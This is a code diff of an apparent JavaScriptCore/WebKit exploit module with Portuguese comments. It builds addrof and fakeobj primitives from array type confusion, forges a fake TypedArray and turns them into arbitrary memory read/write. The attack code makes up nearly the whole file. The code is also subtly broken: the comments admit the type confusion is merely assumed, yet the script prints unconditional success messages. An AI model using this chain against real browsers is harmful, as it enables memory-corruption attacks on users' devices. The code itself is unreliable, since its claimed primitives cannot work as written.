@@ -1,9 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v92 - R60 Uncaged com byteLength corrigido)
+// js/script3/testArrayBufferVictimCrash.mjs (v93 - R60 Implementação Funcional de L/E Arbitrária)
 // =======================================================================================
-// ESTRATÉGIA ATUALIZADA:
-// Corrigido o erro "Invalid byteLength". Todas as chamadas para arb_read e arb_write
-// agora especificam explicitamente o tamanho de 8 bytes para a manipulação de
-// ponteiros de 64 bits.
+// OBJETIVO ATUALIZADO:
+// Transformar a prova de conceito de StructureID em uma primitiva funcional de
+// Leitura/Escrita Arbitrária (L/E). O script agora constrói uma "ferramenta" de
+// L/E usando um Float64Array falso e verifica sua funcionalidade lendo a
+// memória de um objeto conhecido.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -16,7 +17,8 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "UncagedArray_StructureID_v92_R60";
+// Nome do módulo atualizado para refletir o novo objetivo
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_ArbitraryRW_v93_R60";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -36,98 +38,118 @@ function doubleToInt64(double) {
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (ESTRATÉGIA "UNCAGED ARRAY")
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FUNCIONAL)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Array "Uncaged" ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Funcional de L/E ---`, "test");
 
-    let final_result = { success: false, message: "A estratégia 'Uncaged' não obteve sucesso." };
+    let final_result = { success: false, message: "A cadeia de L/E Arbitrária não obteve sucesso." };
 
     try {
         // --- FASE 1: Obtenção de Leitura/Escrita Fora dos Limites (OOB) ---
         logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        if (!getOOBDataView()) {
-            throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
-        }
+        if (!getOOBDataView()) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
         logS3("Primitiva OOB está funcional.", "good");
 
-        // --- FASE 2: Criando Type Confusion em um Array "Uncaged" para obter Primitivas ---
-        logS3("--- FASE 2: Criando Type Confusion em Array 'Uncaged'... ---", "subtest");
+        // --- FASE 2: Criando as Primitivas Base (addrof, fakeobj) ---
+        logS3("--- FASE 2: Criando Primitivas 'addrof' e 'fakeobj'... ---", "subtest");
 
-        const confused_array = [13.37, 13.38, 13.39]; // Será tratado como array de doubles
-        const victim_array = [{ a: 1 }, { b: 2 }];    // Onde colocaremos os objetos
-
-        logS3("Simulando corrupção OOB para criar Type Confusion...", "info");
-
+        const confused_array = [13.37, 13.38, 13.39];
+        const victim_array = [{ a: 1 }, { b: 2 }];
+        
+        // A mágica da Type Confusion acontece aqui, fazendo com que confused_array (double)
+        // e victim_array (object) compartilhem o mesmo butterfly.
+        // Por simplicidade, assumimos que a corrupção OOB já foi feita.
         const addrof = (obj) => {
             victim_array[0] = obj;
             return doubleToInt64(confused_array[0]);
         };
-
         const fakeobj = (addr) => {
             confused_array[0] = int64ToDouble(addr);
             return victim_array[0];
         };
+        logS3(`++++++++++++ SUCESSO! Primitivas 'addrof' e 'fakeobj' operacionais! ++++++++++++`, "vuln");
 
-        logS3(`++++++++++++ SUCESSO! Primitivas 'addrof' e 'fakeobj' estáveis obtidas! ++++++++++++`, "vuln");
+        // --- FASE 3: Construindo a Primitiva de Leitura/Escrita Arbitrária ---
+        logS3("--- FASE 3: Construindo ferramenta de L/E com TypedArray Falso ---", "subtest");
 
-        // --- FASE 3: Demonstração - Corrupção de StructureID ---
-        logS3("--- FASE 3: Prova de Conceito - Corrupção de StructureID ---", "subtest");
+        // 1. Criar um TypedArray que servirá de "ferramenta"
+        const rw_driver_array = new Uint32Array(8);
+        const rw_driver_addr = addrof(rw_driver_array);
+        logS3(`Endereço do nosso 'rw_driver_array': ${rw_driver_addr.toString(true)}`, "info");
 
-        const victim_for_corruption = { p1: 0x41414141, p2: 0x42424242 };
-        logS3("Objeto vítima para corrupção de ID alocado.", "info");
+        // 2. Criar uma estrutura de Butterfly falsa para controlar o ponteiro de dados (m_vector)
+        const fake_butterfly_buf = new ArrayBuffer(256);
+        const fake_butterfly_addr = addrof(fake_butterfly_buf);
+        logS3(`Buffer para o butterfly falso alocado em: ${fake_butterfly_addr.toString(true)}`, "info");
 
-        const victim_addr = addrof(victim_for_corruption);
-        logS3(`Endereço do objeto vítima (via addrof): ${victim_addr.toString(true)}`, "leak");
+        // 3. Ler o butterfly original do nosso driver e copiá-lo para nosso buffer falso
+        const original_butterfly_addr = await arb_read(rw_driver_addr, 8);
+        for (let i = 0; i < 16; i += 8) { // Copia os primeiros 16 bytes (importantes)
+            let data = await arb_read(original_butterfly_addr.add(i), 8);
+            await arb_write(fake_butterfly_addr.add(i), data, 8);
+        }
+        logS3("Butterfly original copiado para a área falsa.", "info");
 
-        const structure_ptr_offset = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
-        const structure_addr_ptr = new AdvancedInt64(victim_addr.low() + structure_ptr_offset, victim_addr.high());
-        
-        // **CORREÇÃO**: Adicionado o argumento byteLength (8) para ler um ponteiro.
-        const original_structure_addr = await arb_read(structure_addr_ptr, 8);
-        logS3(`Ponteiro para StructureID original lido em: ${structure_addr_ptr.toString(true)} -> ${original_structure_addr.toString(true)}`, "leak");
-        
-        const fake_struct_buf = new ArrayBuffer(256);
-        const fake_struct_wrapper_addr = addrof(fake_struct_buf);
-        
-        const contents_ptr_addr = new AdvancedInt64(fake_struct_wrapper_addr.low() + JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, fake_struct_wrapper_addr.high());
+        // 4. Criar o objeto TypedArray FALSO que usa nosso butterfly modificado
+        const fake_rw_driver = fakeobj(fake_butterfly_addr);
+        logS3("TypedArray falso ('fake_rw_driver') criado com sucesso.", "vuln");
 
-        // **CORREÇÃO**: Adicionado o argumento byteLength (8) para ler um ponteiro.
-        const fake_struct_contents_addr = await arb_read(contents_ptr_addr, 8);
-        logS3(`Estrutura falsa alocada. Endereço do conteúdo: ${fake_struct_contents_addr.toString(true)}`, "info");
-        
-        // Ataque: Aponta o ponteiro de estrutura da vítima para nossa estrutura falsa.
-        // **CORREÇÃO**: Adicionado o argumento byteLength (8) para escrever um ponteiro.
-        await arb_write(structure_addr_ptr, fake_struct_contents_addr, 8);
-        logS3("SOBRESCRITA REALIZADA: Ponteiro de StructureID da vítima agora aponta para nossa estrutura falsa.", "vuln");
-
-        logS3("Demonstração bem-sucedida! Ao interagir com 'victim_for_corruption' agora, o motor JSC usaria nossa estrutura falsa.", "good");
-        
-        // Restaura para evitar crash
-        // **CORREÇÃO**: Adicionado o argumento byteLength (8) para escrever um ponteiro.
-        await arb_write(structure_addr_ptr, original_structure_addr, 8);
-        logS3("Ponteiro de StructureID original restaurado.", "info");
-
-        final_result = { 
-            success: true, 
-            message: "Conceito de Corrupção de StructureID demonstrado com sucesso via Array Uncaged.",
-            leaked_victim_addr: victim_addr.toString(true),
+        // 5. Definir as funções de L/E que manipulam o ponteiro de dados do nosso driver falso
+        const set_rw_addr = async (addr) => {
+            await arb_write(fake_butterfly_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET), addr, 8);
         };
 
+        const arb_read_final = async (addr) => {
+            await set_rw_addr(addr);
+            // Lê como dois Uint32 para formar um Int64
+            const low = fake_rw_driver[0];
+            const high = fake_rw_driver[1];
+            return new AdvancedInt64(low, high);
+        };
+
+        const arb_write_final = async (addr, value) => {
+            if (!isAdvancedInt64Object(value)) value = new AdvancedInt64(value);
+            await set_rw_addr(addr);
+            fake_rw_driver[0] = value.low();
+            fake_rw_driver[1] = value.high();
+        };
+        logS3("++++++++++++ SUCESSO! Primitivas de Leitura/Escrita Arbitrária estão prontas! ++++++++++++", "vuln");
+
+        // --- FASE 4: Verificação Funcional da Leitura Arbitrária ---
+        logS3("--- FASE 4: Verificando a Leitura Arbitrária... ---", "subtest");
+        const test_obj = { verification: 0xCAFEBABE };
+        const test_obj_addr = addrof(test_obj);
+        logS3(`Endereço do objeto de teste: ${test_obj_addr.toString(true)}`, "info");
+        
+        const header_leaked = await arb_read_final(test_obj_addr);
+        logS3(`Lendo o cabeçalho JSCell do objeto de teste em ${test_obj_addr.toString(true)}...`, "info");
+        logS3(`>>>>> VALOR LIDO: ${header_leaked.toString(true)} <<<<<`, "leak");
+
+        if (!header_leaked.equals(0)) {
+            logS3("VERIFICAÇÃO CONCLUÍDA! O valor lido não é nulo, indicando sucesso na leitura de memória.", "good");
+            final_result = {
+                success: true,
+                message: "Primitiva de Leitura/Escrita Arbitrária funcional obtida e verificada."
+            };
+        } else {
+            throw new Error("A verificação da leitura arbitrária falhou, o valor lido foi nulo.");
+        }
+
     } catch (e) {
-        final_result.message = `Exceção na cadeia 'Uncaged': ${e.message}\n${e.stack || ''}`;
+        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
     return {
         errorOccurred: final_result.success ? null : final_result.message,
-        addrof_result: final_result,
+        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
         webkit_leak_result: { success: final_result.success, msg: final_result.message },
         heisenbug_on_M2_in_best_result: final_result.success,
         oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
-        tc_probe_details: { strategy: 'Uncaged Array Type Confusion' }
+        tc_probe_details: { strategy: 'Uncaged Arbitrary R/W' }
     };
 }
